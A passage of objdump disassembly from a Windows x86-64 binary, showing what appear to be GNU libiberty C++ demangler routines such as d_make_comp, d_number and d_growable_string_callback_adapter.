   140001d0f:	0f 87 9b 00 00 00    	ja     140001db0 <d_make_comp+0xb0>
   140001d15:	83 fa 29             	cmp    $0x29,%edx
   140001d18:	76 26                	jbe    140001d40 <d_make_comp+0x40>
   140001d1a:	8d 42 d6             	lea    -0x2a(%rdx),%eax
   140001d1d:	83 f8 08             	cmp    $0x8,%eax
   140001d20:	0f 87 a8 00 00 00    	ja     140001dce <d_make_comp+0xce>
   140001d26:	48 8d 0d d3 f6 34 00 	lea    0x34f6d3(%rip),%rcx        # 140351400 <.rdata>
   140001d2d:	48 63 04 81          	movslq (%rcx,%rax,4),%rax
   140001d31:	48 01 c8             	add    %rcx,%rax
   140001d34:	ff e0                	jmp    *%rax
   140001d36:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001d3d:	00 00 00 
   140001d40:	89 d1                	mov    %edx,%ecx
   140001d42:	b8 01 00 00 00       	mov    $0x1,%eax
   140001d47:	48 d3 e0             	shl    %cl,%rax
   140001d4a:	48 b9 00 f6 ff 00 f8 	movabs $0x2f800fff600,%rcx
   140001d51:	02 00 00 
   140001d54:	48 85 c8             	test   %rcx,%rax
   140001d57:	75 7f                	jne    140001dd8 <d_make_comp+0xd8>
   140001d59:	48 b9 00 00 00 fe 03 	movabs $0x3fe000000,%rcx
   140001d60:	00 00 00 
   140001d63:	48 85 c8             	test   %rcx,%rax
   140001d66:	75 16                	jne    140001d7e <d_make_comp+0x7e>
   140001d68:	48 81 c1 1e 08 00 02 	add    $0x200081e,%rcx
   140001d6f:	48 85 c8             	test   %rcx,%rax
   140001d72:	74 5a                	je     140001dce <d_make_comp+0xce>
   140001d74:	4d 85 c0             	test   %r8,%r8
   140001d77:	74 55                	je     140001dce <d_make_comp+0xce>
   140001d79:	4d 85 c9             	test   %r9,%r9
   140001d7c:	74 50                	je     140001dce <d_make_comp+0xce>
   140001d7e:	41 8b 4a 28          	mov    0x28(%r10),%ecx
   140001d82:	41 3b 4a 2c          	cmp    0x2c(%r10),%ecx
   140001d86:	7d 46                	jge    140001dce <d_make_comp+0xce>
   140001d88:	48 63 c1             	movslq %ecx,%rax
   140001d8b:	83 c1 01             	add    $0x1,%ecx
   140001d8e:	48 c1 e0 05          	shl    $0x5,%rax
   140001d92:	49 03 42 20          	add    0x20(%r10),%rax
   140001d96:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   140001d9d:	00 
   140001d9e:	41 89 4a 28          	mov    %ecx,0x28(%r10)
   140001da2:	89 10                	mov    %edx,(%rax)
   140001da4:	4c 89 40 10          	mov    %r8,0x10(%rax)
   140001da8:	4c 89 48 18          	mov    %r9,0x18(%rax)
   140001dac:	c3                   	ret
   140001dad:	0f 1f 00             	nopl   (%rax)
   140001db0:	8d 4a cb             	lea    -0x35(%rdx),%ecx
   140001db3:	b8 01 00 00 00       	mov    $0x1,%eax
   140001db8:	48 d3 e0             	shl    %cl,%rax
   140001dbb:	a9 07 11 c7 01       	test   $0x1c71107,%eax
   140001dc0:	75 16                	jne    140001dd8 <d_make_comp+0xd8>
   140001dc2:	a9 f8 2e 00 0a       	test   $0xa002ef8,%eax
   140001dc7:	75 ab                	jne    140001d74 <d_make_comp+0x74>
   140001dc9:	83 fa 4f             	cmp    $0x4f,%edx
   140001dcc:	74 b0                	je     140001d7e <d_make_comp+0x7e>
   140001dce:	31 c0                	xor    %eax,%eax
   140001dd0:	c3                   	ret
   140001dd1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001dd8:	4d 85 c0             	test   %r8,%r8
   140001ddb:	75 a1                	jne    140001d7e <d_make_comp+0x7e>
   140001ddd:	31 c0                	xor    %eax,%eax
   140001ddf:	eb ef                	jmp    140001dd0 <d_make_comp+0xd0>
   140001de1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001de8:	8d 42 ae             	lea    -0x52(%rdx),%eax
   140001deb:	83 f8 0c             	cmp    $0xc,%eax
   140001dee:	77 e8                	ja     140001dd8 <d_make_comp+0xd8>
   140001df0:	48 8d 0d 2d f6 34 00 	lea    0x34f62d(%rip),%rcx        # 140351424 <.rdata+0x24>
   140001df7:	48 63 04 81          	movslq (%rcx,%rax,4),%rax
   140001dfb:	48 01 c8             	add    %rcx,%rax
   140001dfe:	ff e0                	jmp    *%rax

0000000140001e00 <d_make_name>:
   140001e00:	44 8b 49 28          	mov    0x28(%rcx),%r9d
   140001e04:	44 3b 49 2c          	cmp    0x2c(%rcx),%r9d
   140001e08:	7d 46                	jge    140001e50 <d_make_name+0x50>
   140001e0a:	49 63 c1             	movslq %r9d,%rax
   140001e0d:	41 83 c1 01          	add    $0x1,%r9d
   140001e11:	48 c1 e0 05          	shl    $0x5,%rax
   140001e15:	48 03 41 20          	add    0x20(%rcx),%rax
   140001e19:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   140001e20:	00 
   140001e21:	44 89 49 28          	mov    %r9d,0x28(%rcx)
   140001e25:	48 85 d2             	test   %rdx,%rdx
   140001e28:	74 26                	je     140001e50 <d_make_name+0x50>
   140001e2a:	45 85 c0             	test   %r8d,%r8d
   140001e2d:	7e 21                	jle    140001e50 <d_make_name+0x50>
   140001e2f:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   140001e36:	00 
   140001e37:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001e3d:	48 89 50 10          	mov    %rdx,0x10(%rax)
   140001e41:	44 89 40 18          	mov    %r8d,0x18(%rax)
   140001e45:	c3                   	ret
   140001e46:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001e4d:	00 00 00 
   140001e50:	31 c0                	xor    %eax,%eax
   140001e52:	c3                   	ret
   140001e53:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001e5a:	00 00 00 00 
   140001e5e:	66 90                	xchg   %ax,%ax

0000000140001e60 <d_number>:
   140001e60:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140001e64:	0f b6 02             	movzbl (%rdx),%eax
   140001e67:	49 89 c8             	mov    %rcx,%r8
   140001e6a:	3c 6e                	cmp    $0x6e,%al
   140001e6c:	0f 84 9e 00 00 00    	je     140001f10 <d_number+0xb0>
   140001e72:	8d 50 d0             	lea    -0x30(%rax),%edx
   140001e75:	80 fa 09             	cmp    $0x9,%dl
   140001e78:	0f 87 b1 00 00 00    	ja     140001f2f <d_number+0xcf>
   140001e7e:	45 31 db             	xor    %r11d,%r11d
   140001e81:	31 c9                	xor    %ecx,%ecx
   140001e83:	41 ba ff ff ff 7f    	mov    $0x7fffffff,%r10d
   140001e89:	41 b9 cd cc cc cc    	mov    $0xcccccccd,%r9d
   140001e8f:	eb 4d                	jmp    140001ede <d_number+0x7e>
   140001e91:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001e98:	00 00 00 00 
   140001e9c:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001ea3:	00 00 00 00 
   140001ea7:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001eae:	00 00 00 00 
   140001eb2:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001eb9:	00 00 00 00 
   140001ebd:	0f 1f 00             	nopl   (%rax)
   140001ec0:	8d 14 89             	lea    (%rcx,%rcx,4),%edx
   140001ec3:	8d 0c 50             	lea    (%rax,%rdx,2),%ecx
   140001ec6:	49 8b 40 18          	mov    0x18(%r8),%rax
   140001eca:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140001ece:	49 89 50 18          	mov    %rdx,0x18(%r8)
   140001ed2:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   140001ed6:	8d 50 d0             	lea    -0x30(%rax),%edx
   140001ed9:	80 fa 09             	cmp    $0x9,%dl
   140001edc:	77 22                	ja     140001f00 <d_number+0xa0>
   140001ede:	83 e8 30             	sub    $0x30,%eax
   140001ee1:	44 89 d2             	mov    %r10d,%edx
   140001ee4:	0f be c0             	movsbl %al,%eax
   140001ee7:	29 c2                	sub    %eax,%edx
   140001ee9:	49 0f af d1          	imul   %r9,%rdx
   140001eed:	48 c1 ea 23          	shr    $0x23,%rdx
   140001ef1:	39 ca                	cmp    %ecx,%edx
   140001ef3:	7d cb                	jge    140001ec0 <d_number+0x60>
   140001ef5:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140001efa:	89 c8                	mov    %ecx,%eax
   140001efc:	c3                   	ret
   140001efd:	0f 1f 00             	nopl   (%rax)
   140001f00:	89 c8                	mov    %ecx,%eax
   140001f02:	f7 d8                	neg    %eax
   140001f04:	45 85 db             	test   %r11d,%r11d
   140001f07:	0f 45 c8             	cmovne %eax,%ecx
   140001f0a:	89 c8                	mov    %ecx,%eax
   140001f0c:	c3                   	ret
   140001f0d:	0f 1f 00             	nopl   (%rax)
   140001f10:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140001f14:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140001f18:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140001f1c:	8d 50 d0             	lea    -0x30(%rax),%edx
   140001f1f:	80 fa 09             	cmp    $0x9,%dl
   140001f22:	77 0b                	ja     140001f2f <d_number+0xcf>
   140001f24:	41 bb 01 00 00 00    	mov    $0x1,%r11d
   140001f2a:	e9 52 ff ff ff       	jmp    140001e81 <d_number+0x21>
   140001f2f:	31 c9                	xor    %ecx,%ecx
   140001f31:	eb c7                	jmp    140001efa <d_number+0x9a>
   140001f33:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001f3a:	00 00 00 00 
   140001f3e:	66 90                	xchg   %ax,%ax

0000000140001f40 <d_call_offset>:
   140001f40:	53                   	push   %rbx
   140001f41:	48 83 ec 20          	sub    $0x20,%rsp
   140001f45:	48 89 cb             	mov    %rcx,%rbx
   140001f48:	85 d2                	test   %edx,%edx
   140001f4a:	74 24                	je     140001f70 <d_call_offset+0x30>
   140001f4c:	83 fa 68             	cmp    $0x68,%edx
   140001f4f:	74 47                	je     140001f98 <d_call_offset+0x58>
   140001f51:	48 89 d9             	mov    %rbx,%rcx
   140001f54:	e8 07 ff ff ff       	call   140001e60 <d_number>
   140001f59:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140001f5d:	80 38 5f             	cmpb   $0x5f,(%rax)
   140001f60:	74 2e                	je     140001f90 <d_call_offset+0x50>
   140001f62:	31 c0                	xor    %eax,%eax
   140001f64:	48 83 c4 20          	add    $0x20,%rsp
   140001f68:	5b                   	pop    %rbx
   140001f69:	c3                   	ret
   140001f6a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001f70:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140001f74:	80 38 00             	cmpb   $0x0,(%rax)
   140001f77:	74 e9                	je     140001f62 <d_call_offset+0x22>
   140001f79:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140001f7d:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140001f81:	0f be 00             	movsbl (%rax),%eax
   140001f84:	83 f8 68             	cmp    $0x68,%eax
   140001f87:	74 0f                	je     140001f98 <d_call_offset+0x58>
   140001f89:	83 f8 76             	cmp    $0x76,%eax
   140001f8c:	75 d4                	jne    140001f62 <d_call_offset+0x22>
   140001f8e:	eb c1                	jmp    140001f51 <d_call_offset+0x11>
   140001f90:	48 83 c0 01          	add    $0x1,%rax
   140001f94:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140001f98:	48 89 d9             	mov    %rbx,%rcx
   140001f9b:	e8 c0 fe ff ff       	call   140001e60 <d_number>
   140001fa0:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140001fa4:	80 38 5f             	cmpb   $0x5f,(%rax)
   140001fa7:	75 b9                	jne    140001f62 <d_call_offset+0x22>
   140001fa9:	48 83 c0 01          	add    $0x1,%rax
   140001fad:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140001fb1:	b8 01 00 00 00       	mov    $0x1,%eax
   140001fb6:	48 83 c4 20          	add    $0x20,%rsp
   140001fba:	5b                   	pop    %rbx
   140001fbb:	c3                   	ret
   140001fbc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000140001fc0 <d_ref_qualifier>:
   140001fc0:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140001fc4:	49 89 d0             	mov    %rdx,%r8
   140001fc7:	0f b6 10             	movzbl (%rax),%edx
   140001fca:	80 fa 52             	cmp    $0x52,%dl
   140001fcd:	74 11                	je     140001fe0 <d_ref_qualifier+0x20>
   140001fcf:	80 fa 4f             	cmp    $0x4f,%dl
   140001fd2:	74 0c                	je     140001fe0 <d_ref_qualifier+0x20>
   140001fd4:	4c 89 c0             	mov    %r8,%rax
   140001fd7:	c3                   	ret
   140001fd8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001fdf:	00 
   140001fe0:	44 8b 59 48          	mov    0x48(%rcx),%r11d
   140001fe4:	41 ba 20 00 00 00    	mov    $0x20,%r10d
   140001fea:	45 8d 4b 03          	lea    0x3(%r11),%r9d
   140001fee:	80 fa 52             	cmp    $0x52,%dl
   140001ff1:	74 1d                	je     140002010 <d_ref_qualifier+0x50>
   140001ff3:	44 89 49 48          	mov    %r9d,0x48(%rcx)
   140001ff7:	48 83 c0 01          	add    $0x1,%rax
   140001ffb:	45 31 c9             	xor    %r9d,%r9d
   140001ffe:	44 89 d2             	mov    %r10d,%edx
   140002001:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140002005:	e9 f6 fc ff ff       	jmp    140001d00 <d_make_comp>
   14000200a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002010:	45 8d 4b 02          	lea    0x2(%r11),%r9d
   140002014:	41 ba 1f 00 00 00    	mov    $0x1f,%r10d
   14000201a:	eb d7                	jmp    140001ff3 <d_ref_qualifier+0x33>
   14000201c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000140002020 <d_discriminator>:
   140002020:	48 83 ec 28          	sub    $0x28,%rsp
   140002024:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140002028:	80 38 5f             	cmpb   $0x5f,(%rax)
   14000202b:	75 17                	jne    140002044 <d_discriminator+0x24>
   14000202d:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140002031:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140002035:	80 78 01 5f          	cmpb   $0x5f,0x1(%rax)
   140002039:	74 15                	je     140002050 <d_discriminator+0x30>
   14000203b:	e8 20 fe ff ff       	call   140001e60 <d_number>
   140002040:	85 c0                	test   %eax,%eax
   140002042:	78 44                	js     140002088 <d_discriminator+0x68>
   140002044:	b8 01 00 00 00       	mov    $0x1,%eax
   140002049:	48 83 c4 28          	add    $0x28,%rsp
   14000204d:	c3                   	ret
   14000204e:	66 90                	xchg   %ax,%ax
   140002050:	48 83 c0 02          	add    $0x2,%rax
   140002054:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140002059:	48 89 41 18          	mov    %rax,0x18(%rcx)
   14000205d:	e8 fe fd ff ff       	call   140001e60 <d_number>
   140002062:	85 c0                	test   %eax,%eax
   140002064:	78 22                	js     140002088 <d_discriminator+0x68>
   140002066:	83 f8 09             	cmp    $0x9,%eax
   140002069:	7e d9                	jle    140002044 <d_discriminator+0x24>
   14000206b:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140002070:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140002074:	80 38 5f             	cmpb   $0x5f,(%rax)
   140002077:	75 0f                	jne    140002088 <d_discriminator+0x68>
   140002079:	48 83 c0 01          	add    $0x1,%rax
   14000207d:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140002081:	eb c1                	jmp    140002044 <d_discriminator+0x24>
   140002083:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002088:	31 c0                	xor    %eax,%eax
   14000208a:	48 83 c4 28          	add    $0x28,%rsp
   14000208e:	c3                   	ret
   14000208f:	90                   	nop

0000000140002090 <d_count_templates_scopes>:
   140002090:	56                   	push   %rsi
   140002091:	53                   	push   %rbx
   140002092:	48 83 ec 28          	sub    $0x28,%rsp
   140002096:	48 89 ce             	mov    %rcx,%rsi
   140002099:	48 89 d3             	mov    %rdx,%rbx
   14000209c:	48 85 d2             	test   %rdx,%rdx
   14000209f:	74 76                	je     140002117 <d_count_templates_scopes+0x87>
   1400020a1:	8b 43 08             	mov    0x8(%rbx),%eax
   1400020a4:	83 f8 01             	cmp    $0x1,%eax
   1400020a7:	7f 6e                	jg     140002117 <d_count_templates_scopes+0x87>
   1400020a9:	8b 96 34 01 00 00    	mov    0x134(%rsi),%edx
   1400020af:	81 fa 00 04 00 00    	cmp    $0x400,%edx
   1400020b5:	7f 60                	jg     140002117 <d_count_templates_scopes+0x87>
   1400020b7:	8b 0b                	mov    (%rbx),%ecx
   1400020b9:	83 c0 01             	add    $0x1,%eax
   1400020bc:	89 43 08             	mov    %eax,0x8(%rbx)
   1400020bf:	83 f9 34             	cmp    $0x34,%ecx
   1400020c2:	0f 87 98 00 00 00    	ja     140002160 <d_count_templates_scopes+0xd0>
   1400020c8:	83 f9 08             	cmp    $0x8,%ecx
   1400020cb:	77 53                	ja     140002120 <d_count_templates_scopes+0x90>
   1400020cd:	83 f9 07             	cmp    $0x7,%ecx
   1400020d0:	74 7e                	je     140002150 <d_count_templates_scopes+0xc0>
   1400020d2:	83 f9 08             	cmp    $0x8,%ecx
   1400020d5:	74 79                	je     140002150 <d_count_templates_scopes+0xc0>
   1400020d7:	83 f9 03             	cmp    $0x3,%ecx
   1400020da:	0f 86 e8 00 00 00    	jbe    1400021c8 <d_count_templates_scopes+0x138>
   1400020e0:	83 f9 04             	cmp    $0x4,%ecx
   1400020e3:	75 32                	jne    140002117 <d_count_templates_scopes+0x87>
   1400020e5:	83 86 6c 01 00 00 01 	addl   $0x1,0x16c(%rsi)
   1400020ec:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1400020f0:	83 c2 01             	add    $0x1,%edx
   1400020f3:	48 89 f1             	mov    %rsi,%rcx
   1400020f6:	89 96 34 01 00 00    	mov    %edx,0x134(%rsi)
   1400020fc:	48 89 c2             	mov    %rax,%rdx
   1400020ff:	e8 8c ff ff ff       	call   140002090 <d_count_templates_scopes>
   140002104:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140002108:	48 89 f1             	mov    %rsi,%rcx
   14000210b:	e8 80 ff ff ff       	call   140002090 <d_count_templates_scopes>
   140002110:	83 ae 34 01 00 00 01 	subl   $0x1,0x134(%rsi)
   140002117:	48 83 c4 28          	add    $0x28,%rsp
   14000211b:	5b                   	pop    %rbx
   14000211c:	5e                   	pop    %rsi
   14000211d:	c3                   	ret
   14000211e:	66 90                	xchg   %ax,%ax
   140002120:	49 b8 00 fe ff fe cf 	movabs $0x7decffefffe00,%r8
   140002127:	de 07 00 
   14000212a:	b8 01 00 00 00       	mov    $0x1,%eax
   14000212f:	48 d3 e0             	shl    %cl,%rax
   140002132:	4c 85 c0             	test   %r8,%rax
   140002135:	75 b5                	jne    1400020ec <d_count_templates_scopes+0x5c>
   140002137:	49 b8 00 00 00 00 30 	movabs $0x3000000000,%r8
   14000213e:	00 00 00 
   140002141:	4c 85 c0             	test   %r8,%rax
   140002144:	75 62                	jne    1400021a8 <d_count_templates_scopes+0x118>
   140002146:	83 f9 34             	cmp    $0x34,%ecx
   140002149:	75 cc                	jne    140002117 <d_count_templates_scopes+0x87>
   14000214b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002150:	48 8b 5b 18          	mov    0x18(%rbx),%rbx
   140002154:	48 85 db             	test   %rbx,%rbx
   140002157:	0f 85 44 ff ff ff    	jne    1400020a1 <d_count_templates_scopes+0x11>
   14000215d:	eb b8                	jmp    140002117 <d_count_templates_scopes+0x87>
   14000215f:	90                   	nop
   140002160:	83 e9 35             	sub    $0x35,%ecx
   140002163:	83 f9 29             	cmp    $0x29,%ecx
   140002166:	77 af                	ja     140002117 <d_count_templates_scopes+0x87>
   140002168:	b8 01 00 00 00       	mov    $0x1,%eax
   14000216d:	48 d3 e0             	shl    %cl,%rax
   140002170:	48 b9 ff 3f c1 6f 00 	movabs $0x2006fc13fff,%rcx
   140002177:	02 00 00 
   14000217a:	48 85 c8             	test   %rcx,%rax
   14000217d:	0f 85 69 ff ff ff    	jne    1400020ec <d_count_templates_scopes+0x5c>
   140002183:	48 ba 00 00 06 10 04 	movabs $0x410060000,%rdx
   14000218a:	00 00 00 
   14000218d:	48 85 d0             	test   %rdx,%rax
   140002190:	75 0b                	jne    14000219d <d_count_templates_scopes+0x10d>
   140002192:	a9 00 00 18 00       	test   $0x180000,%eax
   140002197:	0f 84 7a ff ff ff    	je     140002117 <d_count_templates_scopes+0x87>
   14000219d:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   1400021a1:	eb b1                	jmp    140002154 <d_count_templates_scopes+0xc4>
   1400021a3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400021a8:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1400021ac:	83 38 05             	cmpl   $0x5,(%rax)
   1400021af:	0f 85 3b ff ff ff    	jne    1400020f0 <d_count_templates_scopes+0x60>
   1400021b5:	83 86 5c 01 00 00 01 	addl   $0x1,0x15c(%rsi)
   1400021bc:	e9 2f ff ff ff       	jmp    1400020f0 <d_count_templates_scopes+0x60>
   1400021c1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400021c8:	85 c9                	test   %ecx,%ecx
   1400021ca:	0f 85 1c ff ff ff    	jne    1400020ec <d_count_templates_scopes+0x5c>
   1400021d0:	e9 42 ff ff ff       	jmp    140002117 <d_count_templates_scopes+0x87>
   1400021d5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400021dc:	00 00 00 00 

00000001400021e0 <d_pack_length>:
   1400021e0:	31 c0                	xor    %eax,%eax
   1400021e2:	48 85 c9             	test   %rcx,%rcx
   1400021e5:	75 1c                	jne    140002203 <d_pack_length+0x23>
   1400021e7:	eb 1f                	jmp    140002208 <d_pack_length+0x28>
   1400021e9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400021f0:	48 83 79 10 00       	cmpq   $0x0,0x10(%rcx)
   1400021f5:	74 11                	je     140002208 <d_pack_length+0x28>
   1400021f7:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   1400021fb:	83 c0 01             	add    $0x1,%eax
   1400021fe:	48 85 c9             	test   %rcx,%rcx
   140002201:	74 05                	je     140002208 <d_pack_length+0x28>
   140002203:	83 39 30             	cmpl   $0x30,(%rcx)
   140002206:	74 e8                	je     1400021f0 <d_pack_length+0x10>
   140002208:	c3                   	ret
   140002209:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000140002210 <d_index_template_argument.part.0>:
   140002210:	48 85 c9             	test   %rcx,%rcx
   140002213:	75 1b                	jne    140002230 <d_index_template_argument.part.0+0x20>
   140002215:	eb 1e                	jmp    140002235 <d_index_template_argument.part.0+0x25>
   140002217:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000221e:	00 00 
   140002220:	85 d2                	test   %edx,%edx
   140002222:	74 1c                	je     140002240 <d_index_template_argument.part.0+0x30>
   140002224:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140002228:	83 ea 01             	sub    $0x1,%edx
   14000222b:	48 85 c9             	test   %rcx,%rcx
   14000222e:	74 05                	je     140002235 <d_index_template_argument.part.0+0x25>
   140002230:	83 39 30             	cmpl   $0x30,(%rcx)
   140002233:	74 eb                	je     140002220 <d_index_template_argument.part.0+0x10>
   140002235:	31 c0                	xor    %eax,%eax
   140002237:	c3                   	ret
   140002238:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000223f:	00 
   140002240:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140002244:	c3                   	ret
   140002245:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000224c:	00 00 00 00 

0000000140002250 <d_growable_string_callback_adapter>:
   140002250:	55                   	push   %rbp
   140002251:	57                   	push   %rdi
   140002252:	56                   	push   %rsi
   140002253:	53                   	push   %rbx
   140002254:	48 83 ec 28          	sub    $0x28,%rsp
   140002258:	49 8b 40 08          	mov    0x8(%r8),%rax
   14000225c:	49 8b 70 10          	mov    0x10(%r8),%rsi
   140002260:	48 8d 44 02 01       	lea    0x1(%rdx,%rax,1),%rax
   140002265:	48 89 cd             	mov    %rcx,%rbp
   140002268:	48 89 d7             	mov    %rdx,%rdi
   14000226b:	4c 89 c3             	mov    %r8,%rbx
   14000226e:	48 39 c6             	cmp    %rax,%rsi
   140002271:	72 3d                	jb     1400022b0 <d_growable_string_callback_adapter+0x60>
   140002273:	8b 43 18             	mov    0x18(%rbx),%eax
   140002276:	85 c0                	test   %eax,%eax
   140002278:	75 23                	jne    14000229d <d_growable_string_callback_adapter+0x4d>
   14000227a:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000227e:	49 89 f8             	mov    %rdi,%r8
   140002281:	48 03 0b             	add    (%rbx),%rcx
   140002284:	48 89 ea             	mov    %rbp,%rdx
   140002287:	e8 54 38 01 00       	call   140015ae0 <memcpy>
   14000228c:	48 8b 03             	mov    (%rbx),%rax
   14000228f:	48 01 f8             	add    %rdi,%rax
   140002292:	48 03 43 08          	add    0x8(%rbx),%rax
   140002296:	c6 00 00             	movb   $0x0,(%rax)
   140002299:	48 01 7b 08          	add    %rdi,0x8(%rbx)
   14000229d:	48 83 c4 28          	add    $0x28,%rsp
   1400022a1:	5b                   	pop    %rbx
   1400022a2:	5e                   	pop    %rsi
   1400022a3:	5f                   	pop    %rdi
   1400022a4:	5d                   	pop    %rbp
   1400022a5:	c3                   	ret
   1400022a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400022ad:	00 00 00 
   1400022b0:	41 8b 48 18          	mov    0x18(%r8),%ecx
   1400022b4:	85 c9                	test   %ecx,%ecx
   1400022b6:	75 e5                	jne    14000229d <d_growable_string_callback_adapter+0x4d>
   1400022b8:	48 85 f6             	test   %rsi,%rsi
   1400022bb:	74 2b                	je     1400022e8 <d_growable_string_callback_adapter+0x98>
   1400022bd:	0f 1f 00             	nopl   (%rax)
   1400022c0:	48 01 f6             	add    %rsi,%rsi
   1400022c3:	48 39 c6             	cmp    %rax,%rsi
   1400022c6:	72 f8                	jb     1400022c0 <d_growable_string_callback_adapter+0x70>
   1400022c8:	48 8b 0b             	mov    (%rbx),%rcx
   1400022cb:	48 89 f2             	mov    %rsi,%rdx
   1400022ce:	e8 25 38 01 00       	call   140015af8 <realloc>
   1400022d3:	48 85 c0             	test   %rax,%rax
   1400022d6:	74 1d                	je     1400022f5 <d_growable_string_callback_adapter+0xa5>
   1400022d8:	48 89 03             	mov    %rax,(%rbx)
   1400022db:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   1400022df:	eb 92                	jmp    140002273 <d_growable_string_callback_adapter+0x23>
   1400022e1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400022e8:	be 02 00 00 00       	mov    $0x2,%esi
   1400022ed:	48 83 f8 02          	cmp    $0x2,%rax
   1400022f1:	77 cd                	ja     1400022c0 <d_growable_string_callback_adapter+0x70>
   1400022f3:	eb d3                	jmp    1400022c8 <d_growable_string_callback_adapter+0x78>
   1400022f5:	48 8b 0b             	mov    (%rbx),%rcx
   1400022f8:	e8 ab 37 01 00       	call   140015aa8 <free>
   1400022fd:	31 d2                	xor    %edx,%edx
   1400022ff:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140002303:	c7 43 18 01 00 00 00 	movl   $0x1,0x18(%rbx)
   14000230a:	48 89 13             	mov    %rdx,(%rbx)
   14000230d:	0f 11 43 08          	movups %xmm0,0x8(%rbx)
   140002311:	eb 8a                	jmp    14000229d <d_growable_string_callback_adapter+0x4d>
   140002313:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000231a:	00 00 00 00 
   14000231e:	66 90                	xchg   %ax,%ax

0000000140002320 <is_designated_init.part.0.isra.0>:
   140002320:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140002324:	48 8b 10             	mov    (%rax),%rdx
   140002327:	31 c0                	xor    %eax,%eax
   140002329:	80 3a 64             	cmpb   $0x64,(%rdx)
   14000232c:	74 02                	je     140002330 <is_designated_init.part.0.isra.0+0x10>
   14000232e:	c3                   	ret
   14000232f:	90                   	nop
   140002330:	0f b6 52 01          	movzbl 0x1(%rdx),%edx
   140002334:	83 ea 58             	sub    $0x58,%edx
   140002337:	80 fa 20             	cmp    $0x20,%dl
   14000233a:	77 f2                	ja     14000232e <is_designated_init.part.0.isra.0+0xe>
   14000233c:	48 b8 01 00 02 00 01 	movabs $0x100020001,%rax
   140002343:	00 00 00 
   140002346:	48 0f a3 d0          	bt     %rdx,%rax
   14000234a:	0f 92 c0             	setb   %al
   14000234d:	0f b6 c0             	movzbl %al,%eax
   140002350:	c3                   	ret
   140002351:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002358:	00 00 00 00 
   14000235c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000140002360 <next_is_type_qual.isra.0>:
   140002360:	0f b6 11             	movzbl (%rcx),%edx
   140002363:	8d 42 b5             	lea    -0x4b(%rdx),%eax
   140002366:	3c 27                	cmp    $0x27,%al
   140002368:	76 0e                	jbe    140002378 <next_is_type_qual.isra.0+0x18>
